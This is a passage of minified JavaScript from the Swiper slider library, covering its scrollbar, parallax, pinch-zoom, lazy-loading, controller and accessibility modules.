            !1 === t.params.scrollbar.enabled ? N() : (L(), y(), g())
        })), n("update resize observerUpdate lock unlock", (() => {
            y()
        })), n("setTranslate", (() => {
            g()
        })), n("setTransition", ((e, s) => {
            ! function(e) {
                t.params.scrollbar.el && t.scrollbar.el && t.scrollbar.$dragEl.transition(e)
            }(s)
        })), n("enable disable", (() => {
            const {
                $el: e
            } = t.scrollbar;
            e && e[t.enabled ? "removeClass" : "addClass"](t.params.scrollbar.lockClass)
        })), n("destroy", (() => {
            B()
        }));
        const N = () => {
            t.$el.addClass(t.params.scrollbar.scrollbarDisabledClass), t.scrollbar.$el && t.scrollbar.$el.addClass(t.params.scrollbar.scrollbarDisabledClass), B()
        };
        Object.assign(t.scrollbar, {
            enable: () => {
                t.$el.removeClass(t.params.scrollbar.scrollbarDisabledClass), t.scrollbar.$el && t.scrollbar.$el.removeClass(t.params.scrollbar.scrollbarDisabledClass), L(), y(), g()
            },
            disable: N,
            updateSize: y,
            setTranslate: g,
            init: L,
            destroy: B
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;
        s({
            parallax: {
                enabled: !1
            }
        });
        const n = (e, s) => {
                const {
                    rtl: a
                } = t, n = c(e), r = a ? -1 : 1, o = n.attr("data-swiper-parallax") || "0";
                let i = n.attr("data-swiper-parallax-x"),
                    l = n.attr("data-swiper-parallax-y");
                const d = n.attr("data-swiper-parallax-scale"),
                    u = n.attr("data-swiper-parallax-opacity");
                if (i || l ? (i = i || "0", l = l || "0") : t.isHorizontal() ? (i = o, l = "0") : (l = o, i = "0"), i = i.indexOf("%") >= 0 ? parseInt(i, 10) * s * r + "%" : i * s * r + "px", l = l.indexOf("%") >= 0 ? parseInt(l, 10) * s + "%" : l * s + "px", null != u) {
                    const e = u - (u - 1) * (1 - Math.abs(s));
                    n[0].style.opacity = e
                }
                if (null == d) n.transform(`translate3d(${i}, ${l}, 0px)`);
                else {
                    const e = d - (d - 1) * (1 - Math.abs(s));
                    n.transform(`translate3d(${i}, ${l}, 0px) scale(${e})`)
                }
            },
            r = () => {
                const {
                    $el: e,
                    slides: s,
                    progress: a,
                    snapGrid: r
                } = t;
                e.children("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each((e => {
                    n(e, a)
                })), s.each(((e, s) => {
                    let o = e.progress;
                    t.params.slidesPerGroup > 1 && "auto" !== t.params.slidesPerView && (o += Math.ceil(s / 2) - a * (r.length - 1)), o = Math.min(Math.max(o, -1), 1), c(e).find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each((e => {
                        n(e, o)
                    }))
                }))
            };
        a("beforeInit", (() => {
            t.params.parallax.enabled && (t.params.watchSlidesProgress = !0, t.originalParams.watchSlidesProgress = !0)
        })), a("init", (() => {
            t.params.parallax.enabled && r()
        })), a("setTranslate", (() => {
            t.params.parallax.enabled && r()
        })), a("setTransition", ((e, s) => {
            t.params.parallax.enabled && function(e) {
                void 0 === e && (e = t.params.speed);
                const {
                    $el: s
                } = t;
                s.find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each((t => {
                    const s = c(t);
                    let a = parseInt(s.attr("data-swiper-parallax-duration"), 10) || e;
                    0 === e && (a = 0), s.transition(a)
                }))
            }(s)
        }))
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a,
            emit: n
        } = e;
        const o = r();
        s({
            zoom: {
                enabled: !1,
                maxRatio: 3,
                minRatio: 1,
                toggle: !0,
                containerClass: "swiper-zoom-container",
                zoomedSlideClass: "swiper-slide-zoomed"
            }
        }), t.zoom = {
            enabled: !1
        };
        let i, l, d, u = 1,
            p = !1;
        const f = {
                $slideEl: void 0,
                slideWidth: void 0,
                slideHeight: void 0,
                $imageEl: void 0,
                $imageWrapEl: void 0,
                maxRatio: 3
            },
            h = {
                isTouched: void 0,
                isMoved: void 0,
                currentX: void 0,
                currentY: void 0,
                minX: void 0,
                minY: void 0,
                maxX: void 0,
                maxY: void 0,
                width: void 0,
                height: void 0,
                startX: void 0,
                startY: void 0,
                touchesStart: {},
                touchesCurrent: {}
            },
            g = {
                x: void 0,
                y: void 0,
                prevPositionX: void 0,
                prevPositionY: void 0,
                prevTime: void 0
            };
        let y = 1;

        function v(e) {
            if (e.targetTouches.length < 2) return 1;
            const t = e.targetTouches[0].pageX,
                s = e.targetTouches[0].pageY,
                a = e.targetTouches[1].pageX,
                n = e.targetTouches[1].pageY;
            return Math.sqrt((a - t) ** 2 + (n - s) ** 2)
        }

        function b(e) {
            const s = t.support,
                a = t.params.zoom;
            if (l = !1, d = !1, !s.gestures) {
                if ("touchstart" !== e.type || "touchstart" === e.type && e.targetTouches.length < 2) return;
                l = !0, f.scaleStart = v(e)
            }
            f.$slideEl && f.$slideEl.length || (f.$slideEl = c(e.target).closest(`.${t.params.slideClass}`), 0 === f.$slideEl.length && (f.$slideEl = t.slides.eq(t.activeIndex)), f.$imageEl = f.$slideEl.find(`.${a.containerClass}`).eq(0).find("picture, img, svg, canvas, .swiper-zoom-target").eq(0), f.$imageWrapEl = f.$imageEl.parent(`.${a.containerClass}`), f.maxRatio = f.$imageWrapEl.attr("data-swiper-zoom") || a.maxRatio, 0 !== f.$imageWrapEl.length) ? (f.$imageEl && f.$imageEl.transition(0), p = !0) : f.$imageEl = void 0
        }

        function w(e) {
            const s = t.support,
                a = t.params.zoom,
                n = t.zoom;
            if (!s.gestures) {
                if ("touchmove" !== e.type || "touchmove" === e.type && e.targetTouches.length < 2) return;
                d = !0, f.scaleMove = v(e)
            }
            f.$imageEl && 0 !== f.$imageEl.length ? (s.gestures ? n.scale = e.scale * u : n.scale = f.scaleMove / f.scaleStart * u, n.scale > f.maxRatio && (n.scale = f.maxRatio - 1 + (n.scale - f.maxRatio + 1) ** .5), n.scale < a.minRatio && (n.scale = a.minRatio + 1 - (a.minRatio - n.scale + 1) ** .5), f.$imageEl.transform(`translate3d(0,0,0) scale(${n.scale})`)) : "gesturechange" === e.type && b(e)
        }

        function C(e) {
            const s = t.device,
                a = t.support,
                n = t.params.zoom,
                r = t.zoom;
            if (!a.gestures) {
                if (!l || !d) return;
                if ("touchend" !== e.type || "touchend" === e.type && e.changedTouches.length < 2 && !s.android) return;
                l = !1, d = !1
            }
            f.$imageEl && 0 !== f.$imageEl.length && (r.scale = Math.max(Math.min(r.scale, f.maxRatio), n.minRatio), f.$imageEl.transition(t.params.speed).transform(`translate3d(0,0,0) scale(${r.scale})`), u = r.scale, p = !1, 1 === r.scale && (f.$slideEl = void 0))
        }

        function E(e) {
            const s = t.zoom;
            if (!f.$imageEl || 0 === f.$imageEl.length) return;
            if (t.allowClick = !1, !h.isTouched || !f.$slideEl) return;
            h.isMoved || (h.width = f.$imageEl[0].offsetWidth, h.height = f.$imageEl[0].offsetHeight, h.startX = m(f.$imageWrapEl[0], "x") || 0, h.startY = m(f.$imageWrapEl[0], "y") || 0, f.slideWidth = f.$slideEl[0].offsetWidth, f.slideHeight = f.$slideEl[0].offsetHeight, f.$imageWrapEl.transition(0));
            const a = h.width * s.scale,
                n = h.height * s.scale;
            if (!(a < f.slideWidth && n < f.slideHeight)) {
                if (h.minX = Math.min(f.slideWidth / 2 - a / 2, 0), h.maxX = -h.minX, h.minY = Math.min(f.slideHeight / 2 - n / 2, 0), h.maxY = -h.minY, h.touchesCurrent.x = "touchmove" === e.type ? e.targetTouches[0].pageX : e.pageX, h.touchesCurrent.y = "touchmove" === e.type ? e.targetTouches[0].pageY : e.pageY, !h.isMoved && !p) {
                    if (t.isHorizontal() && (Math.floor(h.minX) === Math.floor(h.startX) && h.touchesCurrent.x < h.touchesStart.x || Math.floor(h.maxX) === Math.floor(h.startX) && h.touchesCurrent.x > h.touchesStart.x)) return void(h.isTouched = !1);
                    if (!t.isHorizontal() && (Math.floor(h.minY) === Math.floor(h.startY) && h.touchesCurrent.y < h.touchesStart.y || Math.floor(h.maxY) === Math.floor(h.startY) && h.touchesCurrent.y > h.touchesStart.y)) return void(h.isTouched = !1)
                }
                e.cancelable && e.preventDefault(), e.stopPropagation(), h.isMoved = !0, h.currentX = h.touchesCurrent.x - h.touchesStart.x + h.startX, h.currentY = h.touchesCurrent.y - h.touchesStart.y + h.startY, h.currentX < h.minX && (h.currentX = h.minX + 1 - (h.minX - h.currentX + 1) ** .8), h.currentX > h.maxX && (h.currentX = h.maxX - 1 + (h.currentX - h.maxX + 1) ** .8), h.currentY < h.minY && (h.currentY = h.minY + 1 - (h.minY - h.currentY + 1) ** .8), h.currentY > h.maxY && (h.currentY = h.maxY - 1 + (h.currentY - h.maxY + 1) ** .8), g.prevPositionX || (g.prevPositionX = h.touchesCurrent.x), g.prevPositionY || (g.prevPositionY = h.touchesCurrent.y), g.prevTime || (g.prevTime = Date.now()), g.x = (h.touchesCurrent.x - g.prevPositionX) / (Date.now() - g.prevTime) / 2, g.y = (h.touchesCurrent.y - g.prevPositionY) / (Date.now() - g.prevTime) / 2, Math.abs(h.touchesCurrent.x - g.prevPositionX) < 2 && (g.x = 0), Math.abs(h.touchesCurrent.y - g.prevPositionY) < 2 && (g.y = 0), g.prevPositionX = h.touchesCurrent.x, g.prevPositionY = h.touchesCurrent.y, g.prevTime = Date.now(), f.$imageWrapEl.transform(`translate3d(${h.currentX}px, ${h.currentY}px,0)`)
            }
        }

        function _() {
            const e = t.zoom;
            f.$slideEl && t.previousIndex !== t.activeIndex && (f.$imageEl && f.$imageEl.transform("translate3d(0,0,0) scale(1)"), f.$imageWrapEl && f.$imageWrapEl.transform("translate3d(0,0,0)"), e.scale = 1, u = 1, f.$slideEl = void 0, f.$imageEl = void 0, f.$imageWrapEl = void 0)
        }

        function L(e) {
            const s = t.zoom,
                a = t.params.zoom;
            if (f.$slideEl || (e && e.target && (f.$slideEl = c(e.target).closest(`.${t.params.slideClass}`)), f.$slideEl || (t.params.virtual && t.params.virtual.enabled && t.virtual ? f.$slideEl = t.$wrapperEl.children(`.${t.params.slideActiveClass}`) : f.$slideEl = t.slides.eq(t.activeIndex)), f.$imageEl = f.$slideEl.find(`.${a.containerClass}`).eq(0).find("picture, img, svg, canvas, .swiper-zoom-target").eq(0), f.$imageWrapEl = f.$imageEl.parent(`.${a.containerClass}`)), !f.$imageEl || 0 === f.$imageEl.length || !f.$imageWrapEl || 0 === f.$imageWrapEl.length) return;
            let n, r, i, l, d, p, m, g, y, v, b, w, C, E, _, L, B, N;
            t.params.cssMode && (t.wrapperEl.style.overflow = "hidden", t.wrapperEl.style.touchAction = "none"), f.$slideEl.addClass(`${a.zoomedSlideClass}`), void 0 === h.touchesStart.x && e ? (n = "touchend" === e.type ? e.changedTouches[0].pageX : e.pageX, r = "touchend" === e.type ? e.changedTouches[0].pageY : e.pageY) : (n = h.touchesStart.x, r = h.touchesStart.y), s.scale = f.$imageWrapEl.attr("data-swiper-zoom") || a.maxRatio, u = f.$imageWrapEl.attr("data-swiper-zoom") || a.maxRatio, e ? (B = f.$slideEl[0].offsetWidth, N = f.$slideEl[0].offsetHeight, i = f.$slideEl.offset().left + o.scrollX, l = f.$slideEl.offset().top + o.scrollY, d = i + B / 2 - n, p = l + N / 2 - r, y = f.$imageEl[0].offsetWidth, v = f.$imageEl[0].offsetHeight, b = y * s.scale, w = v * s.scale, C = Math.min(B / 2 - b / 2, 0), E = Math.min(N / 2 - w / 2, 0), _ = -C, L = -E, m = d * s.scale, g = p * s.scale, m < C && (m = C), m > _ && (m = _), g < E && (g = E), g > L && (g = L)) : (m = 0, g = 0), f.$imageWrapEl.transition(300).transform(`translate3d(${m}px, ${g}px,0)`), f.$imageEl.transition(300).transform(`translate3d(0,0,0) scale(${s.scale})`)
        }

        function B() {
            const e = t.zoom,
                s = t.params.zoom;
            f.$slideEl || (t.params.virtual && t.params.virtual.enabled && t.virtual ? f.$slideEl = t.$wrapperEl.children(`.${t.params.slideActiveClass}`) : f.$slideEl = t.slides.eq(t.activeIndex), f.$imageEl = f.$slideEl.find(`.${s.containerClass}`).eq(0).find("picture, img, svg, canvas, .swiper-zoom-target").eq(0), f.$imageWrapEl = f.$imageEl.parent(`.${s.containerClass}`)), f.$imageEl && 0 !== f.$imageEl.length && f.$imageWrapEl && 0 !== f.$imageWrapEl.length && (t.params.cssMode && (t.wrapperEl.style.overflow = "", t.wrapperEl.style.touchAction = ""), e.scale = 1, u = 1, f.$imageWrapEl.transition(300).transform("translate3d(0,0,0)"), f.$imageEl.transition(300).transform("translate3d(0,0,0) scale(1)"), f.$slideEl.removeClass(`${s.zoomedSlideClass}`), f.$slideEl = void 0)
        }

        function N(e) {
            const s = t.zoom;
            s.scale && 1 !== s.scale ? B() : L(e)
        }

        function T() {
            const e = t.support;
            return {
                passiveListener: !("touchstart" !== t.touchEvents.start || !e.passiveListener || !t.params.passiveListeners) && {
                    passive: !0,
                    capture: !1
                },
                activeListenerWithCapture: !e.passiveListener || {
                    passive: !1,
                    capture: !0
                }
            }
        }

        function x() {
            return `.${t.params.slideClass}`
        }

        function S(e) {
            const {
                passiveListener: s
            } = T(), a = x();
            t.$wrapperEl[e]("gesturestart", a, b, s), t.$wrapperEl[e]("gesturechange", a, w, s), t.$wrapperEl[e]("gestureend", a, C, s)
        }

        function A() {
            i || (i = !0, S("on"))
        }

        function k() {
            i && (i = !1, S("off"))
        }

        function M() {
            const e = t.zoom;
            if (e.enabled) return;
            e.enabled = !0;
            const s = t.support,
                {
                    passiveListener: a,
                    activeListenerWithCapture: n
                } = T(),
                r = x();
            s.gestures ? (t.$wrapperEl.on(t.touchEvents.start, A, a), t.$wrapperEl.on(t.touchEvents.end, k, a)) : "touchstart" === t.touchEvents.start && (t.$wrapperEl.on(t.touchEvents.start, r, b, a), t.$wrapperEl.on(t.touchEvents.move, r, w, n), t.$wrapperEl.on(t.touchEvents.end, r, C, a), t.touchEvents.cancel && t.$wrapperEl.on(t.touchEvents.cancel, r, C, a)), t.$wrapperEl.on(t.touchEvents.move, `.${t.params.zoom.containerClass}`, E, n)
        }

        function I() {
            const e = t.zoom;
            if (!e.enabled) return;
            const s = t.support;
            e.enabled = !1;
            const {
                passiveListener: a,
                activeListenerWithCapture: n
            } = T(), r = x();
            s.gestures ? (t.$wrapperEl.off(t.touchEvents.start, A, a), t.$wrapperEl.off(t.touchEvents.end, k, a)) : "touchstart" === t.touchEvents.start && (t.$wrapperEl.off(t.touchEvents.start, r, b, a), t.$wrapperEl.off(t.touchEvents.move, r, w, n), t.$wrapperEl.off(t.touchEvents.end, r, C, a), t.touchEvents.cancel && t.$wrapperEl.off(t.touchEvents.cancel, r, C, a)), t.$wrapperEl.off(t.touchEvents.move, `.${t.params.zoom.containerClass}`, E, n)
        }
        Object.defineProperty(t.zoom, "scale", {
            get: () => y,
            set(e) {
                if (y !== e) {
                    const t = f.$imageEl ? f.$imageEl[0] : void 0,
                        s = f.$slideEl ? f.$slideEl[0] : void 0;
                    n("zoomChange", e, t, s)
                }
                y = e
            }
        }), a("init", (() => {
            t.params.zoom.enabled && M()
        })), a("destroy", (() => {
            I()
        })), a("touchStart", ((e, s) => {
            t.zoom.enabled && function(e) {
                const s = t.device;
                f.$imageEl && 0 !== f.$imageEl.length && (h.isTouched || (s.android && e.cancelable && e.preventDefault(), h.isTouched = !0, h.touchesStart.x = "touchstart" === e.type ? e.targetTouches[0].pageX : e.pageX, h.touchesStart.y = "touchstart" === e.type ? e.targetTouches[0].pageY : e.pageY))
            }(s)
        })), a("touchEnd", ((e, s) => {
            t.zoom.enabled && function() {
                const e = t.zoom;
                if (!f.$imageEl || 0 === f.$imageEl.length) return;
                if (!h.isTouched || !h.isMoved) return h.isTouched = !1, void(h.isMoved = !1);
                h.isTouched = !1, h.isMoved = !1;
                let s = 300,
                    a = 300;
                const n = g.x * s,
                    r = h.currentX + n,
                    o = g.y * a,
                    i = h.currentY + o;
                0 !== g.x && (s = Math.abs((r - h.currentX) / g.x)), 0 !== g.y && (a = Math.abs((i - h.currentY) / g.y));
                const l = Math.max(s, a);
                h.currentX = r, h.currentY = i;
                const c = h.width * e.scale,
                    d = h.height * e.scale;
                h.minX = Math.min(f.slideWidth / 2 - c / 2, 0), h.maxX = -h.minX, h.minY = Math.min(f.slideHeight / 2 - d / 2, 0), h.maxY = -h.minY, h.currentX = Math.max(Math.min(h.currentX, h.maxX), h.minX), h.currentY = Math.max(Math.min(h.currentY, h.maxY), h.minY), f.$imageWrapEl.transition(l).transform(`translate3d(${h.currentX}px, ${h.currentY}px,0)`)
            }()
        })), a("doubleTap", ((e, s) => {
            !t.animating && t.params.zoom.enabled && t.zoom.enabled && t.params.zoom.toggle && N(s)
        })), a("transitionEnd", (() => {
            t.zoom.enabled && t.params.zoom.enabled && _()
        })), a("slideChange", (() => {
            t.zoom.enabled && t.params.zoom.enabled && t.params.cssMode && _()
        })), Object.assign(t.zoom, {
            enable: M,
            disable: I,
            in: L,
            out: B,
            toggle: N
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a,
            emit: n
        } = e;
        s({
            lazy: {
                checkInView: !1,
                enabled: !1,
                loadPrevNext: !1,
                loadPrevNextAmount: 1,
                loadOnTransitionStart: !1,
                scrollingElement: "",
                elementClass: "swiper-lazy",
                loadingClass: "swiper-lazy-loading",
                loadedClass: "swiper-lazy-loaded",
                preloaderClass: "swiper-lazy-preloader"
            }
        }), t.lazy = {};
        let o = !1,
            i = !1;

        function l(e, s) {
            void 0 === s && (s = !0);
            const a = t.params.lazy;
            if (void 0 === e) return;
            if (0 === t.slides.length) return;
            const r = t.virtual && t.params.virtual.enabled ? t.$wrapperEl.children(`.${t.params.slideClass}[data-swiper-slide-index="${e}"]`) : t.slides.eq(e),
                o = r.find(`.${a.elementClass}:not(.${a.loadedClass}):not(.${a.loadingClass})`);
            !r.hasClass(a.elementClass) || r.hasClass(a.loadedClass) || r.hasClass(a.loadingClass) || o.push(r[0]), 0 !== o.length && o.each((e => {
                const o = c(e);
                o.addClass(a.loadingClass);
                const i = o.attr("data-background"),
                    d = o.attr("data-src"),
                    u = o.attr("data-srcset"),
                    p = o.attr("data-sizes"),
                    m = o.parent("picture");
                t.loadImage(o[0], d || i, u, p, !1, (() => {
                    if (null != t && t && (!t || t.params) && !t.destroyed) {
                        if (i ? (o.css("background-image", `url("${i}")`), o.removeAttr("data-background")) : (u && (o.attr("srcset", u), o.removeAttr("data-srcset")), p && (o.attr("sizes", p), o.removeAttr("data-sizes")), m.length && m.children("source").each((e => {
                                const t = c(e);
                                t.attr("data-srcset") && (t.attr("srcset", t.attr("data-srcset")), t.removeAttr("data-srcset"))
                            })), d && (o.attr("src", d), o.removeAttr("data-src"))), o.addClass(a.loadedClass).removeClass(a.loadingClass), r.find(`.${a.preloaderClass}`).remove(), t.params.loop && s) {
                            const e = r.attr("data-swiper-slide-index");
                            r.hasClass(t.params.slideDuplicateClass) ? l(t.$wrapperEl.children(`[data-swiper-slide-index="${e}"]:not(.${t.params.slideDuplicateClass})`).index(), !1) : l(t.$wrapperEl.children(`.${t.params.slideDuplicateClass}[data-swiper-slide-index="${e}"]`).index(), !1)
                        }
                        n("lazyImageReady", r[0], o[0]), t.params.autoHeight && t.updateAutoHeight()
                    }
                })), n("lazyImageLoad", r[0], o[0])
            }))
        }

        function d() {
            const {
                $wrapperEl: e,
                params: s,
                slides: a,
                activeIndex: n
            } = t, r = t.virtual && s.virtual.enabled, o = s.lazy;
            let d = s.slidesPerView;

            function u(t) {
                if (r) {
                    if (e.children(`.${s.slideClass}[data-swiper-slide-index="${t}"]`).length) return !0
                } else if (a[t]) return !0;
                return !1
            }

            function p(e) {
                return r ? c(e).attr("data-swiper-slide-index") : c(e).index()
            }
            if ("auto" === d && (d = 0), i || (i = !0), t.params.watchSlidesProgress) e.children(`.${s.slideVisibleClass}`).each((e => {
                l(r ? c(e).attr("data-swiper-slide-index") : c(e).index())
            }));
            else if (d > 1)
                for (let e = n; e < n + d; e += 1) u(e) && l(e);
            else l(n);
            if (o.loadPrevNext)
                if (d > 1 || o.loadPrevNextAmount && o.loadPrevNextAmount > 1) {
                    const e = o.loadPrevNextAmount,
                        t = Math.ceil(d),
                        s = Math.min(n + t + Math.max(e, t), a.length),
                        r = Math.max(n - Math.max(t, e), 0);
                    for (let e = n + t; e < s; e += 1) u(e) && l(e);
                    for (let e = r; e < n; e += 1) u(e) && l(e)
                } else {
                    const t = e.children(`.${s.slideNextClass}`);
                    t.length > 0 && l(p(t));
                    const a = e.children(`.${s.slidePrevClass}`);
                    a.length > 0 && l(p(a))
                }
        }

        function u() {
            const e = r();
            if (!t || t.destroyed) return;
            const s = t.params.lazy.scrollingElement ? c(t.params.lazy.scrollingElement) : c(e),
                a = s[0] === e,
                n = a ? e.innerWidth : s[0].offsetWidth,
                i = a ? e.innerHeight : s[0].offsetHeight,
                l = t.$el.offset(),
                {
                    rtlTranslate: p
                } = t;
            let m = !1;
            p && (l.left -= t.$el[0].scrollLeft);
            const f = [
                [l.left, l.top],
                [l.left + t.width, l.top],
                [l.left, l.top + t.height],
                [l.left + t.width, l.top + t.height]
            ];
            for (let e = 0; e < f.length; e += 1) {
                const t = f[e];
                if (t[0] >= 0 && t[0] <= n && t[1] >= 0 && t[1] <= i) {
                    if (0 === t[0] && 0 === t[1]) continue;
                    m = !0
                }
            }
            const h = !("touchstart" !== t.touchEvents.start || !t.support.passiveListener || !t.params.passiveListeners) && {
                passive: !0,
                capture: !1
            };
            m ? (d(), s.off("scroll", u, h)) : o || (o = !0, s.on("scroll", u, h))
        }
        a("beforeInit", (() => {
            t.params.lazy.enabled && t.params.preloadImages && (t.params.preloadImages = !1)
        })), a("init", (() => {
            t.params.lazy.enabled && (t.params.lazy.checkInView ? u() : d())
        })), a("scroll", (() => {
            t.params.freeMode && t.params.freeMode.enabled && !t.params.freeMode.sticky && d()
        })), a("scrollbarDragMove resize _freeModeNoMomentumRelease", (() => {
            t.params.lazy.enabled && (t.params.lazy.checkInView ? u() : d())
        })), a("transitionStart", (() => {
            t.params.lazy.enabled && (t.params.lazy.loadOnTransitionStart || !t.params.lazy.loadOnTransitionStart && !i) && (t.params.lazy.checkInView ? u() : d())
        })), a("transitionEnd", (() => {
            t.params.lazy.enabled && !t.params.lazy.loadOnTransitionStart && (t.params.lazy.checkInView ? u() : d())
        })), a("slideChange", (() => {
            const {
                lazy: e,
                cssMode: s,
                watchSlidesProgress: a,
                touchReleaseOnEdges: n,
                resistanceRatio: r
            } = t.params;
            e.enabled && (s || a && (n || 0 === r)) && d()
        })), a("destroy", (() => {
            t.$el && t.$el.find(`.${t.params.lazy.loadingClass}`).removeClass(t.params.lazy.loadingClass)
        })), Object.assign(t.lazy, {
            load: d,
            loadInSlide: l
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;

        function n(e, t) {
            const s = function() {
                let e, t, s;
                return (a, n) => {
                    for (t = -1, e = a.length; e - t > 1;) s = e + t >> 1, a[s] <= n ? t = s : e = s;
                    return e
                }
            }();
            let a, n;
            return this.x = e, this.y = t, this.lastIndex = e.length - 1, this.interpolate = function(e) {
                return e ? (n = s(this.x, e), a = n - 1, (e - this.x[a]) * (this.y[n] - this.y[a]) / (this.x[n] - this.x[a]) + this.y[a]) : 0
            }, this
        }

        function r() {
            t.controller.control && t.controller.spline && (t.controller.spline = void 0, delete t.controller.spline)
        }
        s({
            controller: {
                control: void 0,
                inverse: !1,
                by: "slide"
            }
        }), t.controller = {
            control: void 0
        }, a("beforeInit", (() => {
            t.controller.control = t.params.controller.control
        })), a("update", (() => {
            r()
        })), a("resize", (() => {
            r()
        })), a("observerUpdate", (() => {
            r()
        })), a("setTranslate", ((e, s, a) => {
            t.controller.control && t.controller.setTranslate(s, a)
        })), a("setTransition", ((e, s, a) => {
            t.controller.control && t.controller.setTransition(s, a)
        })), Object.assign(t.controller, {
            setTranslate: function(e, s) {
                const a = t.controller.control;
                let r, o;
                const i = t.constructor;

                function l(e) {
                    const s = t.rtlTranslate ? -t.translate : t.translate;
                    "slide" === t.params.controller.by && (function(e) {
                        t.controller.spline || (t.controller.spline = t.params.loop ? new n(t.slidesGrid, e.slidesGrid) : new n(t.snapGrid, e.snapGrid))
                    }(e), o = -t.controller.spline.interpolate(-s)), o && "container" !== t.params.controller.by || (r = (e.maxTranslate() - e.minTranslate()) / (t.maxTranslate() - t.minTranslate()), o = (s - t.minTranslate()) * r + e.minTranslate()), t.params.controller.inverse && (o = e.maxTranslate() - o), e.updateProgress(o), e.setTranslate(o, t), e.updateActiveIndex(), e.updateSlidesClasses()
                }
                if (Array.isArray(a))
                    for (let e = 0; e < a.length; e += 1) a[e] !== s && a[e] instanceof i && l(a[e]);
                else a instanceof i && s !== a && l(a)
            },
            setTransition: function(e, s) {
                const a = t.constructor,
                    n = t.controller.control;
                let r;

                function o(s) {
                    s.setTransition(e, t), 0 !== e && (s.transitionStart(), s.params.autoHeight && u((() => {
                        s.updateAutoHeight()
                    })), s.$wrapperEl.transitionEnd((() => {
                        n && (s.params.loop && "slide" === t.params.controller.by && s.loopFix(), s.transitionEnd())
                    })))
                }
                if (Array.isArray(n))
                    for (r = 0; r < n.length; r += 1) n[r] !== s && n[r] instanceof a && o(n[r]);
                else n instanceof a && s !== n && o(n)
            }
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;
        s({
            a11y: {
                enabled: !0,
                notificationClass: "swiper-notification",
                prevSlideMessage: "Previous slide",
                nextSlideMessage: "Next slide",
                firstSlideMessage: "This is the first slide",
                lastSlideMessage: "This is the last slide",
                paginationBulletMessage: "Go to slide {{index}}",
                slideLabelMessage: "{{index}} / {{slidesLength}}",
                containerMessage: null,
                containerRoleDescriptionMessage: null,
                itemRoleDescriptionMessage: null,
                slideRole: "group",
                id: null
            }
        }), t.a11y = {
            clicked: !1
        };
        let n = null;

        function r(e) {
            const t = n;
            0 !== t.length && (t.html(""), t.html(e))
        }

        function o(e) {
            e.attr("tabIndex", "0")
        }

        function i(e) {
            e.attr("tabIndex", "-1")
        }

        function l(e, t) {
            e.attr("role", t)
        }

        function d(e, t) {
            e.attr("aria-roledescription", t)
        }

        function u(e, t) {
            e.attr("aria-label", t)
        }

        function p(e) {
            e.attr("aria-disabled", !0)
        }

        function m(e) {
            e.attr("aria-disabled", !1)
        }

        function f(e) {
            if (13 !== e.keyCode && 32 !== e.keyCode) return;
            const s = t.params.a11y,
                a = c(e.target);
            t.navigation && t.navigation.$nextEl && a.is(t.navigation.$nextEl) && (t.isEnd && !t.params.loop || t.slideNext(), t.isEnd ? r(s.lastSlideMessage) : r(s.nextSlideMessage)), t.navigation && t.navigation.$prevEl && a.is(t.navigation.$prevEl) && (t.isBeginning && !t.params.loop || t.slidePrev(), t.isBeginning ? r(s.firstSlideMessage) : r(s.prevSlideMessage)), t.pagination && a.is(W(t.params.pagination.bulletClass)) && a[0].click()
        }

        function h() {
            return t.pagination && t.pagination.bullets && t.pagination.bullets.length
        }

        function g() {
            return h() && t.params.pagination.clickable
        }
        const y = (e, t, s) => {
                o(e), "BUTTON" !== e[0].tagName && (l(e, "button"), e.on("keydown", f)), u(e, s),
                    function(e, t) {
                        e.attr("aria-controls", t)
                    }(e, t)
            },
            v = () => {
                t.a11y.clicked = !0
            },
            b = () => {
                requestAnimationFrame((() => {
                    requestAnimationFrame((() => {
                        t.a11y.clicked = !1
                    }))
                }))
            },
            w = e => {
                if (t.a11y.clicked) return;
                const s = e.target.closest(`.${t.params.slideClass}`);
                if (!s || !t.slides.includes(s)) return;
                const a = t.slides.indexOf(s) === t.activeIndex,
                    n = t.params.watchSlidesProgress && t.visibleSlides && t.visibleSlides.includes(s);
                a || n || (t.isHorizontal() ? t.el.scrollLeft = 0 : t.el.scrollTop = 0, t.slideTo(t.slides.indexOf(s), 0))
            },
            C = () => {
                const e = t.params.a11y;
                e.itemRoleDescriptionMessage && d(c(t.slides), e.itemRoleDescriptionMessage), e.slideRole && l(c(t.slides), e.slideRole);
                const s = t.params.loop ? t.slides.filter((e => !e.classList.contains(t.params.slideDuplicateClass))).length : t.slides.length;
                e.slideLabelMessage && t.slides.each(((a, n) => {
                    const r = c(a),
                        o = t.params.loop ? parseInt(r.attr("data-swiper-slide-index"), 10) : n;
                    u(r, e.slideLabelMessage.replace(/\{\{index\}\}/, o + 1).replace(/\{\{slidesLength\}\}/, s))
                }))
            };
        a("beforeInit", (() => {
            n = c(`<span class="${t.params.a11y.notificationClass}" aria-live="assertive" aria-atomic="true"></span>`)
        })), a("afterInit", (() => {
            t.params.a11y.enabled && (() => {
                const e = t.params.a11y;
                t.$el.append(n);
                const s = t.$el;
                e.containerRoleDescriptionMessage && d(s, e.containerRoleDescriptionMessage), e.containerMessage && u(s, e.containerMessage);
                const a = t.$wrapperEl,
                    r = e.id || a.attr("id") || `swiper-wrapper-${o=16,void 0===o&&(o=16),"x".repeat(o).replace(/x/g,(()=>Math.round(16*Math.random()).toString(16)))}`;
                var o;
                const i = t.params.autoplay && t.params.autoplay.enabled ? "off" : "polite";
                var l;
                let c, p;
                l = r, a.attr("id", l),
                    function(e, t) {
                        e.attr("aria-live", t)
                    }(a, i), C(), t.navigation && t.navigation.$nextEl && (c = t.navigation.$nextEl), t.navigation && t.navigation.$prevEl && (p = t.navigation.$prevEl), c && c.length && y(c, r, e.nextSlideMessage), p && p.length && y(p, r, e.prevSlideMessage), g() && t.pagination.$el.on("keydown", W(t.params.pagination.bulletClass), f), t.$el.on("focus", w, !0), t.$el.on("pointerdown", v, !0), t.$el.on("pointerup", b, !0)
            })()
